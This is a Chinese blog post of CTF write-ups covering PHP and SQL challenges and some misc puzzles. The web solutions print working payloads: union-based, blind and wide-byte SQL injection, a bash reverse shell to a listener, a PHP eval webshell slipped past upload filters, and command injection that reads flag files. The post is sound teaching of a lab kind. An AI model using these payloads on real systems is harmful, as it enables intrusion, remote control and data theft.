---
title: 丁牛CTF做题记录
index_img: /img/2019-04-19/index.jpg
date: 2019-04-19 14:15:16
tags: 
- writeup
- misc
- web
- ctf
---
都是些旧题，加深印象。
<!--more-->

### W2-web1
这个是bugku上的login2，在响应头可以看到tip
![2](/img/2019-04-19/2.png)
解码出来是
```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}
```
构造payload
```
username=1' union select md5(1),md5(1)#&password=1
```
即可登录成功，登陆成功后可以看到一个命令执行框，反弹个shell即可
![3](/img/2019-04-19/3.png)
主机执行
```bash
nc -lvvp port
```
然后执行
```bash
|bash -i >& /dev/tcp/ip/port 0>&1
```
flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}
### W2-web2
首先看源代码有个upload.php,但是只能上传jpg，gif，png的格式，url上的file能包含文件进来，但是禁止了php伪协议所以不能读取文件，思路是上传php马然后file包含进来，但是`<!--?php`和`?-->`被过滤了
![4](/img/2019-04-19/4.png)
payload如下
```php
<script language="PHP">
@eval($_POST['a']);
</script>
```
然后菜刀连上去即可拿到flag：CTF{uP104D_1nclud3_426fh8_is_Fun}
### W2-web3
```php
include("flag.php");
if (isset($_GET['a'])) { 
 if (strcmp($_GET['a'], $flag) == 0) 
 die('Flag: '.$flag); 
 else 
print 'close to flag';}
else{
 show_source(__FILE__);
}
?>
```
strcmp的问题，看这里–>[传送门](http://www.am0s.com/ctf/128.html),payload如下
```
a[]=1
```
flag:CTF{php_trcmp_problems}
### W2-web4
```php
show_source(__FILE__);
$username= "this_is_secret"; 
$password= "this_is_not_known_to_you"; 
include("flag.php");//here I changed those two 
$info = isset($_GET['info'])? $_GET['info']: "" ;
$data_unserialize = unserialize($info);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
 echo $flag;
}else{
 echo "username or password error!";
}
?>
```
构造数组绕过
```
Array
(
 [username] => 1
 [password] => 1
)
//序列化后的结果
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```
flag:CTF{this_is_flag}
### W2-web5
![5](/img/2019-04-19/5.png)
在1秒后，3秒内正确提交20次即可
```python
#-*-coding:utf-8
from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
driver=Chrome(executable_path="D:\\Python27\\chromedriver.exe")
login_url="http://39.98.216.116:32795/"
driver.get(login_url)
for i in range(20):
    print '<--test%d-->'%i
    list1 = driver.find_elements_by_tag_name('div')
    tmp = ''
    for i in list1:
        tmp += i.text
    tmp = tmp[:-1]
    print tmp
    tmp = 'res = '+tmp
    exec(tmp)
    print res
    list2 = driver.find_elements_by_tag_name("input")
    list2[0].send_keys(res)
    time.sleep(1)
    list2[1].click()
```
flag:ctf{gr3At_cAcu1a7or}
### W3-web1
在响应头的hint可以看到index.php的源码
![6](/img/2019-04-19/6.png)
```php
<?php
$info = ""; 
$req = [];
$flag="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
ini_set("display_error", false); 
error_reporting(0); 
if(!isset($_GET['number'])){
   header("hint:source.txt");
   die("have a fun!!"); 
}
foreach([$_GET, $_POST] as $global_var) { 
    foreach($global_var as $key => $value) { 
        $value = trim($value); 
        is_string($value) && $req[$key] = addslashes($value); 
    } 
} 
function is_palindrome_number($number) { 
    $number = strval($number); 
    $i = 0; 
    $j = strlen($number) - 1; 
    while($i < $j) { 
        if($number[$i] !== $number[$j]) { 
            return false; 
        } 
        $i++; 
        $j--; 
    } 
    return true; 
}
if(is_numeric($_REQUEST['number'])){

   $info="sorry, you cann't input a number!";
}elseif($req['number']!=strval(intval($req['number']))){
     $info = "number must be equal to it's integer!! ";  
}else{
     $value1 = intval($req["number"]);
     $value2 = intval(strrev($req["number"]));  
     if($value1!=$value2){
          $info="no, this is not a palindrome number!";
     }else{
          
          if(is_palindrome_number($req["number"])){
              $info = "nice! {$value1} is a palindrome number!"; 
          }else{
             $info=$flag;
          }
     }
}
echo $info;
```
拿到flag的条件是
1. 不为空，切不能是一个数值型数字，包括小数（由is_numeric函数判断）。
2. 不能是一个回文数（is_palindrome_number判断）。
3. 该数的反转的整数值应该和它本身的整数值相等。
目前已知的两种解法是
1. 利用intval函数溢出绕过
2. 用科学计数法构造0=0
用第二种方法构造的payload如下
```
number=0e-0%00
```
flag:CTF{b72dd89e71108245fe21a4c1849ae668}
参考–>[传送门](http://www.xianxianlabs.com/2018/07/07/%E5%AE%9E%E9%AA%8C%E5%90%A7-ctf-%E9%A2%98%E7%9B%AE%E4%B9%8B-web-writeup-%E9%80%9A%E5%85%B3%E5%A4%A7%E5%85%A8-1/)

### W3-web2
```php
include "flag.php";
error_reporting(0);
show_source(__FILE__);

$a = @$_REQUEST['hello'];
eval("var_dump($a);");
```
php注入，payload如下
```
);echo%20`cat%20./flag.php`;//
```
flag:flag{92853051ab894a64f7865cf3c2128b34}
### W3-web5
![7](/img/2019-04-19/7.png)
这道题是bugku上的一道注入题，没有过滤，payload如下
```
id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()#
id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 'fl4g'#
id=-1' union select 1,2,3,(select * from fl4g)#
```
![15](/img/2019-04-19/15.png)
flag:CTF{Sql_INJECT0N_4813drd8hz4}

### W3-web3
查看源代码可以看到页面设置了`<html lang="en">`，可能存在宽字节注入
![8](/img/2019-04-19/8.png)
登录框过滤了`空格`，`=`，`and`，但是`or`，`<`,`>`,`'`,`select`都没有过滤，同时用户名正确时只会显示password error
构造测试payload
```
username=admin%df%27or'1'>'1&password=1
username=admin%df%27or'2'>'1&password=1
```
再替换位置
```
username=admin%df%27or(select(password))>'0&password=1
```
不断变大后面的字符串就得到密码的md5值51b7a76d51e70b419f60d3473fb6f900，解密得到skctf123456，然后登录拿到flag
![9](/img/2019-04-19/9.png)
flag：CTF{b1iNd_SQL_iNJEcti0n!}

### W3-web
![10](/img/2019-04-19/10.png)
cbc字节翻转攻击，首先扫描得到源码的备份文件`.index.php.swp`
```php
     $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}
function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '<p>Hello admin</p>';
        echo '<p>Flag is $flag</p>';
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
```
admin被禁止登录，但是我们可以利用反序列化漏洞重置`$_SESSION['username']为admin`
cbc翻转攻击具体可以看师兄的博客–>[传送门](https://delcoding.github.io/2018/03/bugku-writeup4/)
flag：SKCTF{CBC_wEB_cryptography_6646dfgdg6}

### W3-misc3
下载回来的pdf是经过加密的，加密方法是rot13
解密方法
```bash
cat MinionQuest.pdf | tr 'A-Za-z' 'N-ZA-Mn-za-m' > out.pdf
```
![11](/img/2019-04-19/11.png)
解密后的pdf有部分被挡住了，用下面的命令提取pdf的图片
```bash
pdfimages -png result.pdf images
```
得到完整的图片
![12](/img/2019-04-19/12.png)
flag:BITSCTF{save_the_kid}
参考–>[传送门](https://sixfoisneuf.fr/ctf/hacking/english/writeup/2017/02/06/bitsctf-writeup/)
### W3-misc1

下载回来是一个usb流量包，在某一条长度比较大的流量里发现了一张图片
![13](/img/2019-04-19/13.png)
dump出来就可以得到flag，微软照片的bug导致我卡了n个小时，**上面sublime，下面微软的照片**
![14](/img/2019-04-19/14.png)
### W3-misc5

参考–>[传送门](https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/misc/Mysterious-GIF)

